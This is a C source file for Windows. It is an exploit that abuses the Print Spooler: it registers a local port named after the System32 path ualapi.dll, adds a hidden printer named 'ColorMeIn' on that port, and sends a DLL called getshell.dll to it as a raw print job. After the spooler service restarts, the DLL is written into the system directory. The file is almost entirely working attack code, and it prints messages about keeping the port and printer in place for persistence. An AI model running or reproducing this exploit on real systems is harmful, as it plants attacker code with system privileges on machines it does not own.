#include <windows.h>
#include <stdio.h>

LPWSTR g_DriverName = L"Generic / Text Only";
LPWSTR g_PrinterName = L"ColorMeIn";
// modify these values
LPWSTR g_PortName = L"C:\\Windows\\System32\\ualapi.dll";
const char* g_InputFile = "getshell.dll";

INT
main(
    _In_ INT ArgumentCount,
    _In_ PCHAR Arguments[]
)
{
    HRESULT hr;
    PRINTER_INFO_2 printerInfo;
    HANDLE hPrinter;
    HANDLE hMonitor;
    BOOL bRes;
    DWORD dwNeeded, dwStatus;
    PRINTER_DEFAULTS printerDefaults;
    DWORD dwExists;
    struct
    {
        ADDJOB_INFO_1 jobInfo;
        WCHAR pathString[MAX_PATH];
    } job;

    DWORD dwJobId;
    DOC_INFO_1 docInfo;

    //
    // Initialize variables
    //
    UNREFERENCED_PARAMETER(Arguments);
    ZeroMemory(&job, sizeof(job));
    hPrinter = NULL;
    hMonitor = NULL;
 

    //
    // Open a handle to the XCV port of the local spooler
    //
    printerDefaults.pDatatype = NULL;
    printerDefaults.pDevMode = NULL;
    printerDefaults.DesiredAccess = SERVER_ACCESS_ADMINISTER;
    bRes = OpenPrinter(L",XcvMonitor Local Port", &hMonitor, &printerDefaults);
    if (bRes == FALSE)
    {
        printf("Error opening XCV handle: %lx\n", GetLastError());
        goto CleanupPath;
    }

    //
    // Check if the target port name already exists 
    //
    dwNeeded = ((DWORD)wcslen(g_PortName) + 1) * sizeof(WCHAR);
    dwExists = 0;
    bRes = XcvData(hMonitor,
        L"PortExists",
        (LPBYTE)g_PortName,
        dwNeeded,
        (LPBYTE)&dwExists,
        sizeof(dwExists),
        &dwNeeded,
        &dwStatus);
    if (dwExists == 0)
    {
        //
        // It doesn't, so create it!
        //
        dwNeeded = ((DWORD)wcslen(g_PortName) + 1) * sizeof(WCHAR);
        bRes = XcvData(hMonitor,
            L"AddPort",
            (LPBYTE)g_PortName,
            dwNeeded,
            NULL,
            0,
            &dwNeeded,
            &dwStatus);
        if (bRes == FALSE)
        {
            printf("Failed to add port: %lx\n", dwStatus);
            goto CleanupPath;
        }
    }

    //
    // Check if the printer already exists
    //
    printerDefaults.pDatatype = NULL;
    printerDefaults.pDevMode = NULL;
    printerDefaults.DesiredAccess = PRINTER_ALL_ACCESS;
    bRes = OpenPrinter(g_PrinterName, &hPrinter, &printerDefaults);
    if ((bRes == FALSE) && (GetLastError() == ERROR_INVALID_PRINTER_NAME))
    {
        //
        // First, install the generic text only driver. Because this is already
        // installed, no privileges are required to do so.
        //
        hr = InstallPrinterDriverFromPackage(NULL, NULL, g_DriverName, NULL, 0);
        if (FAILED(hr))
        {
            printf("Failed to install print driver: %lx\n", hr);
            goto CleanupPath;
        }

        //
        // Now create a printer to attach to this port
        // This data must be valid and match what we created earlier
        //
        ZeroMemory(&printerInfo, sizeof(printerInfo));
        printerInfo.pPortName = g_PortName;
        printerInfo.pDriverName = g_DriverName;
        printerInfo.pPrinterName = g_PrinterName;

        //
        // This data must always be as indicated here
        //
        printerInfo.pPrintProcessor = L"WinPrint";
        printerInfo.pDatatype = L"RAW";

        //
        // This part is for fun/to find our printer easily
        //
        printerInfo.pComment = L"I'd be careful with this one...";
        printerInfo.pLocation = L"Inside of an exploit";
        printerInfo.Attributes = PRINTER_ATTRIBUTE_RAW_ONLY | PRINTER_ATTRIBUTE_HIDDEN;
        printerInfo.AveragePPM = 9001;
        hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printerInfo);
        if (hPrinter == NULL)
        {
            printf("Failed to create printer: %lx\n", GetLastError());
            goto CleanupPath;
        }
        else
        {
            printf("Printer created successfully");
        }
    }

    //
    // Purge the printer of any previous jobs
    //
    bRes = SetPrinter(hPrinter, 0, NULL, PRINTER_CONTROL_PURGE);
    if (bRes == FALSE)
    {
        printf("Failed to purge jobs: %lx\n", GetLastError());
        goto CleanupPath;
    }

    //
    // Getting the dll buffer data
    //
    HANDLE hFile = CreateFileA(g_InputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == NULL)
    {
        printf("Unable to find input file %s",g_InputFile);
        goto CleanupPath;
    }
    DWORD lFileSize = GetFileSize(hFile, NULL);
    //printf("file size : %d\n", lFileSize);
    BYTE* hDllBuffer = (BYTE*)malloc(lFileSize);
    DWORD lpBytesRead = 0;
    ReadFile(hFile, hDllBuffer, lFileSize, &lpBytesRead, NULL);
    CloseHandle(hFile);


    //
    //Writing to the printer
    //
    docInfo.pDatatype = L"RAW";
    docInfo.pOutputFile = NULL;
    docInfo.pDocName = L"Ignore Me";
    dwJobId = StartDocPrinter(hPrinter, 1, (LPBYTE)&docInfo);
    bRes = WritePrinter(hPrinter,
        hDllBuffer,
        lFileSize,
        &dwNeeded);
    if (bRes == FALSE)
    {
        printf("[-] Failed to write the spooler data: %lx\n", GetLastError());
        goto CleanupPath;
    }
    EndDocPrinter(hPrinter);

    /*
    TODO: Fix this
    //
    // Restarting printer service
    //
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM == NULL)
    {
        printf("[+] Unable to get access to service manager\n");
        return FALSE;
    }
    char* szServiceName = "Spooler";
    SC_HANDLE hService = OpenService(hSCM, szServiceName, SERVICE_STOP);

    if (hService == NULL)
    {
        CloseServiceHandle(hSCM);
        return FALSE;
    }
    SERVICE_STATUS status;
    if (ControlService(hService, SERVICE_CONTROL_STOP, &status) == 0)
    {
        printf("COntrol service failed");
    }
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    */
    //
    // Wait for the client to read it
    //
    printf("[+] Restart the spoolsv service to successfully write...Press Enter to delete the port and" \
    "printer or Ctrl + C for persist them.\n");
    getchar();
    //return 0;

CleanupPath:
    //
    // Now delete the printer and close the handle
    //
    if (hPrinter != NULL)
    {
        bRes = DeletePrinter(hPrinter);
        if (bRes == FALSE)
        {
            //
            // Non fatal, this is the cleanup path
            //
            printf("[-] Failed to delete printer: %lx\n", GetLastError());
        }
        printf("[+] Printer deleted\n");
        ClosePrinter(hPrinter);
    }

    //
    // Cleanup our port
    //
    if (hMonitor != NULL)
    {
        dwNeeded = ((DWORD)wcslen(g_PortName) + 1) * sizeof(WCHAR);
        bRes = XcvData(hMonitor,
            L"DeletePort",
            (LPBYTE)g_PortName,
            dwNeeded,
            NULL,
            0,
            &dwNeeded,
            &dwStatus);
        if (bRes == FALSE)
        {
            //
            // Non fatal, this is the cleanup path
            //
            printf("[-] Failed to delete port: %lx\n", GetLastError());
        }

        //
        // Close the monitor port
        //
        printf("[+] Port deleted\n");
        ClosePrinter(hMonitor);
    }
    return 0;
}